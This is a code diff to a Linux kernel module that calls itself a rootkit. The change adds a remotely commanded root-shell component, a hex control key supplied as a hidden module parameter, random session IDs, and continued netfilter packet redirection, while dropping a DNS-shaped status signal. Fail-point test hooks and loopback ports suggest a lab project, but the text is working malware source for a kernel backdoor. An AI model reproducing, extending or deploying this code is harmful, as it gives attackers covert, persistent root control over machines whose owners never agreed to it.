@@ -3,19 +3,21 @@
 #include <linux/errno.h>
 #include <linux/init.h>
 #include <linux/module.h>
+#include <linux/random.h>
+#include <linux/string.h>
 
+#include "aead.h"
 #include "agent.h"
 #include "agent_status.h"
-#include "dns_query.h"
 #include "packet_redirect.h"
 #include "platform.h"
+#include "root_shell.h"
 #include "rootkit.h"
-#include "status_signal.h"
 #include "transaction.h"
 
-#define RK_FAIL_PACKET_REDIRECT 15
+#define RK_FAIL_PACKET_REDIRECT 14
 
-#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 15
+#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 14
 #error "unknown ROOTKITLINGS_FAIL_POINT"
 #endif
 
@@ -31,13 +33,18 @@ static unsigned int retry_max_ms = 200;
 module_param(retry_max_ms, uint, 0400);
 MODULE_PARM_DESC(retry_max_ms, "maximum reconnect delay in milliseconds");
 
-static unsigned long session_id;
-module_param(session_id, ulong, 0400);
-MODULE_PARM_DESC(session_id, "unique control session identifier");
+static unsigned int shell_timeout_ms = 60000;
+module_param(shell_timeout_ms, uint, 0400);
+MODULE_PARM_DESC(shell_timeout_ms, "root-shell lifetime in milliseconds");
 
-static unsigned short signal_id = 0x1234;
-module_param(signal_id, ushort, 0400);
-MODULE_PARM_DESC(signal_id, "DNS-shaped signal transaction identifier");
+static char control_key_hex[RK_AEAD_KEY_LENGTH * 2 + 1];
+module_param_string(control_key, control_key_hex,
+		    sizeof(control_key_hex), 0000);
+MODULE_PARM_DESC(control_key, "64 hexadecimal control-key digits");
+
+static unsigned long long session_id;
+module_param(session_id, ullong, 0000);
+MODULE_PARM_DESC(session_id, "test-only fixed control session");
 
 static unsigned short redirect_from_port = 5400;
 module_param(redirect_from_port, ushort, 0400);
@@ -47,28 +54,59 @@ static unsigned short redirect_to_port = 5401;
 module_param(redirect_to_port, ushort, 0400);
 MODULE_PARM_DESC(redirect_to_port, "replacement loopback UDP port");
 
-static const u8 control_key[RK_AEAD_KEY_LENGTH] = {
-	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-	0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
-	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
-	0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
-};
-
-static const u8 signal_key[RK_AUTH_KEY_LENGTH] = {
-	0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7,
-	0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf,
-	0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7,
-	0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf,
-};
-
 static struct rk_state *state;
 static struct rk_agent agent;
 static struct rk_netfilter_mutator packet_redirect;
+static struct rk_root_shell root_shell;
 static struct rk_transaction transaction;
 
 static bool rk_packet_actions_enabled(void *context)
 {
 	return rk_state_actions_enabled(context);
+}
+
+static int rk_hex_nibble(char character, u8 *nibble)
+{
+	if (character >= '0' && character <= '9')
+		*nibble = character - '0';
+	else if (character >= 'a' && character <= 'f')
+		*nibble = character - 'a' + 10;
+	else if (character >= 'A' && character <= 'F')
+		*nibble = character - 'A' + 10;
+	else
+		return -EINVAL;
+	return 0;
+}
+
+static int rk_parse_control_key(u8 key[RK_AEAD_KEY_LENGTH])
+{
+	struct {
+		u8 bytes[RK_AEAD_KEY_LENGTH];
+	} candidate = { };
+	size_t index;
+	bool any_nonzero = false;
+	int error = -EINVAL;
+
+	if (strlen(control_key_hex) != RK_AEAD_KEY_LENGTH * 2)
+		goto out;
+	for (index = 0; index < RK_AEAD_KEY_LENGTH; index++) {
+		u8 high;
+		u8 low;
+
+		if (rk_hex_nibble(control_key_hex[index * 2], &high) ||
+		    rk_hex_nibble(control_key_hex[index * 2 + 1], &low))
+			goto out;
+		candidate.bytes[index] = (high << 4) | low;
+		any_nonzero |= candidate.bytes[index] != 0;
+	}
+	if (!any_nonzero)
+		goto out;
+	memcpy(key, candidate.bytes, sizeof(candidate.bytes));
+	error = 0;
+out:
+	memzero_explicit(&candidate, sizeof(candidate));
+	memzero_explicit(control_key_hex, sizeof(control_key_hex));
+	return error;
 }
 
 static int __init rk_init(void)
@@ -81,22 +119,35 @@ static int __init rk_init(void)
 			ROOTKITLINGS_FAIL_POINT == RK_FAIL_PACKET_REDIRECT ?
 			-EINTR : 0,
 	};
+	u8 control_key[RK_AEAD_KEY_LENGTH] = { };
+	u64 session;
 	int error;
 
-	if (!peer_port || !session_id || !retry_base_ms ||
-	    retry_base_ms > retry_max_ms ||
+	session = session_id;
+	session_id = 0;
+	error = rk_parse_control_key(control_key);
+	if (error)
+		return error;
+	if (!peer_port || !retry_base_ms || retry_base_ms > retry_max_ms ||
 	    retry_max_ms > 5000 || !redirect_from_port || !redirect_to_port ||
-	    redirect_from_port == redirect_to_port ||
-	    redirect_from_port == RK_DNS_SIGNAL_PORT)
-		return -EINVAL;
-	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT)
-		return -ECANCELED;
+	    redirect_from_port == redirect_to_port) {
+		error = -EINVAL;
+		goto clear_key;
+	}
+	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT) {
+		error = -ECANCELED;
+		goto clear_key;
+	}
+	if (!session)
+		do {
+			session = get_random_u64();
+		} while (!session);
 
 	state = rk_state_create();
 	if (IS_ERR(state)) {
 		error = PTR_ERR(state);
 		state = NULL;
-		return error;
+		goto clear_key;
 	}
 	redirect_config.enabled_context = state;
 
@@ -119,14 +170,19 @@ static int __init rk_init(void)
 	error = rk_transaction_apply(&transaction);
 	if (error)
 		goto finish_platform;
+	error = rk_root_shell_init(&root_shell, shell_timeout_ms);
+	if (error)
+		goto restore_transaction;
 	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_WORKER)
 		error = -EINTR;
 	else
 		error = rk_agent_start(&agent, peer_port, retry_base_ms,
 				       retry_max_ms, control_key,
-				       sizeof(control_key), session_id, state);
+				       sizeof(control_key), session, state,
+				       &root_shell);
+	memzero_explicit(control_key, sizeof(control_key));
 	if (error)
-		goto restore_transaction;
+		goto stop_root_shell;
 	error = rk_events_publish();
 	if (error)
 		goto stop_agent;
@@ -144,19 +200,9 @@ static int __init rk_init(void)
 		goto stop_packet_redirect;
 
 	rk_scheduler_start(state);
-	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_STATUS_SIGNAL)
-		error = -EIO;
-	else
-		error = rk_status_signal_send(signal_key, sizeof(signal_key),
-					      session_id, 1, 2, signal_id);
-	if (error)
-		goto stop_scheduler;
-
 	rk_agent_enable_commands(&agent);
 	return 0;
 
-stop_scheduler:
-	rk_scheduler_stop();
 stop_packet_redirect:
 	rk_netfilter_stop(&packet_redirect);
 	rk_proc_unpublish();
@@ -168,6 +214,8 @@ unpublish_events:
 	rk_events_unpublish();
 stop_agent:
 	rk_agent_stop(&agent);
+stop_root_shell:
+	rk_root_shell_stop(&root_shell);
 restore_transaction:
 	(void)rk_transaction_restore(&transaction);
 	rk_transaction_dispose(&transaction);
@@ -184,12 +232,15 @@ stop_worker:
 destroy_state:
 	rk_state_destroy(state);
 	state = NULL;
+clear_key:
+	memzero_explicit(control_key, sizeof(control_key));
 	return error;
 }
 
 static void __exit rk_exit(void)
 {
 	rk_agent_stop(&agent);
+	rk_root_shell_stop(&root_shell);
 	rk_scheduler_stop();
 	rk_netfilter_stop(&packet_redirect);
 	rk_proc_unpublish();
